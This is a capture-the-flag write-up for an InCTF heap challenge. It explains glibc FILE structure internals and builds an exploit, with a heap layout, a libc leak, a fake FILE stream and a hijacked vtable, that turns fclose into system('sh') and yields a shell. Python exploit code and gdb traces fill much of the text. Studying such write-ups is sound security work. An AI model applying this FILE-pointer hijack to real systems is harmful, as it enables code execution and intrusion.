```
Points:   200
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Summary

```
1) Add note
2) Remove note
3) View note
4) Open file
5) Close file
6) Edit name
7) Exit
>> 
```

Heap stuff :) Let's get down to recon.

#### ~ Add

Standard stuff. We enter the size of the requested chunk, an index so that it gets stored at a slot in the bss array and finally
our input. Note that we are allowed to allocate chunks of size **>=0x7f**. When entering our input, `read` is being used and
it doesn't null terminate strings, we can get a leak out of it.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/jacks_add.png)

#### ~ Remove

No UAF stuff. The binary free's the pointer depending on the provided index and then zeros out the entry as well.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/jacks_delete.png)

#### ~ Open File

This section of the binary opens up `/dev/null` and stores the FILE struct pointer returned by `fopen` in a global variable called `file`. There's
more to that, keep that in mind.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/jacks_open.png)

#### ~ Close File

Calls `fclose` on the `/dev/null` file stream as long as the `file` variable is not null.

#### ~ Edit

This is where the bug lies. After reading in data and storing it in a bss buffer, it **null terminates** the address of the FILE
struct which was returned by `fopen`. For instance, `0x804040` would become `0x804000`. We can abuse that to redirect code
execution. More on that later.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/jacks_edit.png)

### FILE Structure Internals

After this brief overview of the binary's functionality, let's get down to pwning. Even though I'd start off by getting the libc
leak, the null byte poison in `edit` needs a few malloc voodoo maths in order to leverage it for exploitation and we need
to take care of that firstly. Let me give you a quick rundown on some of the FILE pointer internals. For a more in-depth
overview, I highly recommend checking out the slides by [angelboy](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique). I'll focus on the features which are important for our case.

First of all, a file stream is nothing more than a struct with the following members:

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

// libio.h
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

```

I know, a mess right? But hey, at least now you've unfolded the `FILE *` mystery you've been seeing in your C code! 
Don't stress over it though, our main concern is `_IO_jump_t *vtable` which is an array of function pointers which are used 
for file stream operations (i.e `fopen`, `fread` etc). Another cool feature of this struct is the `struct _IO_FILE *_chain` member
which as some of you might have guessed, is a pointer pointing to another FILE struct. What could that be? Well, `stdout`, 
`stdin` and `stderr` are FILE streams and actually open by default! We'll have a closer view at that shortly. Anyway,
when we request to open a file, `fopen` will call `_IO_new_fopen` internally, which moves on by calling `__fopen_internal`.

```c
_IO_FILE *
_IO_new_fopen (filename, mode)
     const char *filename;
     const char *mode;
{
  return __fopen_internal (filename, mode, 1);
}
```

```c
_IO_FILE *
__fopen_internal (filename, mode, is32)
     const char *filename;
     const char *mode;
     int is32;
{
  struct locked_FILE
  {
    struct _IO_FILE_plus fp;
#ifdef _IO_MTSAFE_IO
    _IO_lock_t lock;
#endif
    struct _IO_wide_data wd;
  } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));

  if (new_f == NULL)
    return NULL;
#ifdef _IO_MTSAFE_IO
  new_f->fp.file._lock = &new_f->lock;
#endif
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  _IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps);
#else
  _IO_no_init (&new_f->fp.file, 1, 0, NULL, NULL);
#endif
  _IO_JUMPS (&new_f->fp) = &_IO_file_jumps;
  _IO_file_init (&new_f->fp);
#if  !_IO_UNIFIED_JUMPTABLES
  new_f->fp.vtable = NULL;
#endif
  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)
    return __fopen_maybe_mmap (&new_f->fp.file);

  _IO_un_link (&new_f->fp);
  free (new_f);
  return NULL;
}
```

With a line of significant importance:

```c
*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));
```

If you actually think about it, when opening a file dynamically (during runtime), the kernel gotta play dynamically as well.
Meaning, the files to be opened (i.e `/dev/null` in our case) are stored on the heap! Basically, the new FILE struct will firstly
be malloc'd, initialized (settings its members to the appropriate values), linked with the rest of the file streams (recall the
`struct _IO_FILE *_chain` member) and then returned back to the user.

```c
if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)
    return __fopen_maybe_mmap (&new_f->fp.file);
```

If something went wrong, the malloc'd area gets **unlinked** from the file stream linked list, then **free'd** and `NULL` is returned
back to the user. 

```c
_IO_un_link (&new_f->fp);
free (new_f);
return NULL;
```

Below is the transition of the file stream linked list along with how a FILE structure looks like in memory.

```
Before:

gdb-peda$ fpchain
fpchain: 0xf7fc3cc0 --> 0xf7fc3d60 --> 0xf7fc35a0 --> 0x0
gdb-peda$ x 0xf7fc3cc0
0xf7fc3cc0 <_IO_2_1_stderr_>:	0xfbad2086
gdb-peda$ x 0xf7fc3d60
0xf7fc3d60 <_IO_2_1_stdout_>:	0xfbad2887
gdb-peda$ x 0xf7fc35a0
0xf7fc35a0 <_IO_2_1_stdin_>:	0xfbad2088
```

```
After:

fpchain: 0x804b3b0 --> 0xf7fc3cc0 --> 0xf7fc3d60 --> 0xf7fc35a0 --> 0x0
gdb-peda$ x 0xf7fc3cc0
0xf7fc3cc0 <_IO_2_1_stderr_>:	0xfbad2086
gdb-peda$ x 0xf7fc3d60
0xf7fc3d60 <_IO_2_1_stdout_>:	0xfbad2887
gdb-peda$ x 0xf7fc35a0
0xf7fc35a0 <_IO_2_1_stdin_>:	0xfbad2088

gdb-peda$ x/40wx 0x804b3b0
0x804b3b0:	0xfbad2488	0x00000000	0x00000000	0x00000000
0x804b3c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b3d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b3e0:	0x00000000	0xf7fc3cc0	0x00000003	0x00000000
0x804b3f0:	0x00000000	0x00000000	0x0804b448	0xffffffff
0x804b400:	0xffffffff	0x00000000	0x0804b454	0x00000000
0x804b410:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b420:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b430:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b440:	0x00000000	0xf7fc2ac0	0x00000000	0x00000000
```

The newly allocated file stream is at `0x804b3b0`. The linked list insertion happens at the **head** of the list. Here's another
helpful view of the file stream thanks to angelboy's [pwngdb](https://github.com/scwuaptx/Pwngdb) tool.

```
gdb-peda$ fp 0x804b3b0
$5 = {
  file = {
    _flags = 0xfbad2488, 
    _IO_read_ptr = 0x0, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x0, 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0xf7fc3cc0 <_IO_2_1_stderr_>, 
    _fileno = 0x3, 
    ...
  }, 
  vtable = 0xf7fc2ac0 <_IO_file_jumps>
}

gdb-peda$ x/21wx 0xf7fc2ac0
0xf7fc2ac0 <_IO_file_jumps>:	0x00000000	0x00000000	0xf7e7a980	0xf7e7b3a0
0xf7fc2ad0 <_IO_file_jumps+16>:	0xf7e7b140	0xf7e7c220	0xf7e7d0b0	0xf7e7a5f0
0xf7fc2ae0 <_IO_file_jumps+32>:	0xf7e7a200	0xf7e794a0	0xf7e7c4c0	0xf7e792e0
0xf7fc2af0 <_IO_file_jumps+48>:	0xf7e791d0	0xf7e6e8c0	0xf7e7a5a0	0xf7e7a050
0xf7fc2b00 <_IO_file_jumps+64>:	0xf7e79d90	0xf7e792b0	0xf7e7a030	0xf7e7d240
0xf7fc2b10 <_IO_file_jumps+80>:	0xf7e7d250
gdb-peda$ x 0xf7e7a980
0xf7e7a980 <_IO_new_file_finish>:	0x08ec8353
gdb-peda$ x 0xf7e7b3a0
0xf7e7b3a0 <_IO_new_file_overflow>:	0x8b535657
gdb-peda$ x 0xf7e792b0
0xf7e792b0 <__GI__IO_file_close>:	0x24448b53
gdb-peda$ x 0xf7e79d90
0xf7e79d90 <__GI__IO_file_seek>:	0x6d6fe853
```

`_IO_jump_t *vtable` has the following structure and gets populated during the file stream's initialization.

```c
struct _IO_jump_t
{
    JUMP_FIELD(_G_size_t, __dummy);
#ifdef _G_USING_THUNKS
    JUMP_FIELD(_G_size_t, __dummy2);
#endif
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

After this quick refresher, let's get back to the pwnable.

### Exploiation Analysis

The goal is to redirect code execution by fooling the binary into thinking that `/dev/null`'s file stream is somewhere else on
the heap along with its vtable so that instead of calling `fclose(fp)` it will call `system("sh")`. Because of the fact that `edit`
null terminates the LSB of the file's pointer, we need to make sure that this null termination occurs in such way that the resulting
address falls under a chunk we have complete control over. You can only understand why this is an issue by trial and error.
The allocations I made were crafted in such manner so that the aforementioned null byte issue can be bypassed. Ofcourse this 
is my personal preference, someone else could have made different allocations.

```python
# 0
alloc(0x108, 0,  'A'*8) 
# 1
alloc(0x158,  1, 'B'*8)
# 2
alloc(0x80,  2, 'C'*8)	
# 3
alloc(0xa8,  3, 'D'*8)
# Trigger malloc
Open()
``` 

```
gdb-peda$ parse
addr                prev      size      status            fd                bk                
0x804b000           0x0       0x110      Used                None              None
0x804b110           0x0       0x160      Used                None              None
0x804b270           0x0       0x88       Used                None              None
0x804b2f8           0x0       0xb0       Used                None              None
0x804b3a8           0x0       0x160      Used                None              None

gdb-peda$ x/wx &file
0x804a100 <file>:	0x0804b3b0
```

Now once we call `edit`, the contents of `file` will become `0x0804b300`, which is exactly where our input is at.

```
gdb-peda$ x/10wx 0x804b2f8
0x804b2f8:	0x00000000	0x000000b1	0x44444444	0x44444444
0x804b308:	0x0000000a	0x00000000	0x00000000	0x00000000
0x804b318:	0x00000000	0x00000000

gdb-peda$ x/s 0x804b300
0x804b300:	"DDDDDDDD\n"
```

Sweet, we officially have control over the file stream. We can now craft a fake `/dev/null` file stream at `0x804b300` with a 
vtable of our choice and place `system` there. But, `system` isn't resolved yet. We have yet to perform a libc leak. It's about
time don't you think?

```python
free(1)
# Enter just enough to leak the main arena pointer
alloc(0x158,  1, 'E'*3)

libc   = leak(1) - 0x1b27b0
```

```
gdb-peda$ x/10wx 0x804b110
0x804b110:	0x00000000	0x00000161	0x0a454545	0xf7fc37b0 <-- main arena pointer
0x804b120:	0x0000000a	0x00000000	0x00000000	0x00000000
```

Now that we've got system's address, let's craft the fake FILE vtable in the bss.

```python
edit(p32(system) + p32(0)*3)
```

The `fclose` vtable pointer is at the 18th index. Because the bss buffer isn't big enough to contain the entire vtable, the 
vtable pointer I crafted on the fake file stream chunk will point to `vtable - 17*4`. 

```
gdb-peda$ x/4wx 0x804a0c0
0x804a0c0 <name>:	0xf7e4bda0	0x00000000	0x00000000	0x00000000
```

All that is left now is to free `0x804b300` and request it back but this time enter the fake file stream as input.

```python
# Free chunk and re-allocate it again to craft the fake FILE structure
free(3)

stream  = 'sh\x00\x00'
stream += p32(0)*12
# Needs to point ot null
stream += p32(0x804a0f0)
stream += p32(3)
stream += p32(0)*3
# Needs to point to null
stream += p32(0x804a0f0)
stream += p32(0xffffffff)*2
stream += p32(0)
# Needs to point to null
stream += p32(0x804a0f0)
stream += p32(0)*14
stream += p32(vtable)

craft(0xa8, 3, stream)
# fclose(fp) => system(fp) => system("sh")
Close()
```

```
gdb-peda$ x/40wx 0x804b2f8
0x804b2f8:	0x00000000	0x000000b1	0x00006873	0x00000000
0x804b308:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b318:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b328:	0x00000000	0x00000000	0x00000000	0x0804a0f0
0x804b338:	0x00000003	0x00000000	0x00000000	0x00000000
0x804b348:	0x0804a0f0	0xffffffff	0xffffffff	0x00000000
0x804b358:	0x0804a0f0	0x00000000	0x00000000	0x00000000
0x804b368:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b378:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b388:	0x00000000	0x00000000	0x00000000	0x0804a07c

gdb-peda$ fp 0x804b300
$8 = {
  file = {
    _flags = 0x6873, 
    _IO_read_ptr = 0x0, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x0, 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x804a0f0 <name+48>, 
    _fileno = 0x3, 
    ...
  }, 
  vtable = 0x804a07c
}
```

The `_fileno` member must remain intact because if it's not an existing file descriptor, an error will be triggered. Let's call
`fclose` on the `/dev/null` file stream and see what happens.
 
 `fclose` will call `_IO_new_fclose` internally and finally `_IO_file_close_it`.
 
 ```c
 int
_IO_new_fclose (fp)
     _IO_FILE *fp;
{
  int status;

  CHECK_FILE(fp, EOF);

  ...

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp); <-- will try to call whatever is at the 18th index in the vtable
```

```
0xf7e7a917 <_IO_new_file_close_it+263>:	mov    eax,DWORD PTR [ebx+eax*1+0x94]
0xf7e7a91e <_IO_new_file_close_it+270>:	push   ebx
0xf7e7a91f <_IO_new_file_close_it+271>:	call   DWORD PTR [eax+0x44]

gdb-peda$ p $eax
$24 = 0x804a07c
gdb-peda$ p $ebx
$25 = 0x804b300
gdb-peda$ x/wx $eax+ 0x44
0x804a0c0 <name>:	0xf7e4bda0
gdb-peda$ x 0xf7e4bda0
0xf7e4bda0 <__libc_system>:	0x8b0cec83
gdb-peda$ x/s 0x804b300
0x804b300:	"sh"
```

Look at that! In practice, `fclose(fp) => fclose(0x804b300) => system(0x804b300) => system("sh")`. Let's watch the full exploit
in action.

```
[+] Libc:   0xf75ff000
[+] system: 0xf7639da0
[*] Switching to interactive mode
$ whoami
jumpingjacks
$ ls
flag
jumping_jacks
libc.so.6
start_chall.sh
$ cat flag
inctf{fil3_p0in7er_m4g1c_1s_fun}
```




